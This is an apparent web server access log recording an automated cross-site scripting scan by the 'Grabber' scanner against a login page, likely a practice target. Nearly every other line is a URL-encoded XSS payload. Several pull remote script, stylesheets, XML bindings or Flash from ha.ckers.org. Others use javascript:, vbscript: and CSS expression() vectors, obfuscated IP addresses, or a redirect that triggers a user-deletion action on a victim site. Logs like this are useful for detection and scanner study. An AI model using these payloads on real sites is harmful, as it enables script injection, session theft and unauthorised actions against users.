172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CIMG+SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CIMG+SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2F0102.0146.0007.00000223%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2F0102.0146.0007.00000223%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2F%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2F%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?password=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?username=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E&user_token=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E&Login=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E&password=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /?username=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E&user_token=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E&Login=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E&password=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:56 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E&user_token=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E&Login=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E&password=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E&user_token=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E&Login=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E&password=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E&user_token=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E&Login=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E&password=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&user_token=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&Login=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&password=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B+xss%3A%26%23101%3Bx%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E&user_token=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B+xss%3A%26%23101%3Bx%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E&Login=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B+xss%3A%26%23101%3Bx%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E&password=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B+xss%3A%26%23101%3Bx%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC%2Fscript%25BE&user_token=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC%2Fscript%25BE&Login=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC%2Fscript%25BE&password=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC%2Fscript%25BE& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E&user_token=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E&Login=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E&password=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E&user_token=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E&Login=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E&password=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=%3CIMG+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28alert%28%27XSS%27%29%29%22%3E&user_token=%3CIMG+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28alert%28%27XSS%27%29%29%22%3E&Login=%3CIMG+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28alert%28%27XSS%27%29%29%22%3E&password=%3CIMG+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28alert%28%27XSS%27%29%29%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E&user_token=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E&Login=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E&password=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E&user_token=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E&Login=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E&password=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E&user_token=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E&Login=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E&password=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser&user_token=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser&Login=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser&password=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E&user_token=%3CA+HREF%3D%22http%3A%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E&Login=%3CA+HREF%3D%22http%3A%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22http%3A%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E&user_token=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E&Login=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E&password=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /?username=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E&user_token=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E&Login=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E&password=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:57 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /?username=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /?username=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E&user_token=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E&Login=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /?username=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E&user_token=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E&Login=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E&password=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /?username=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E&user_token=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E&Login=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E&password=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:58 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
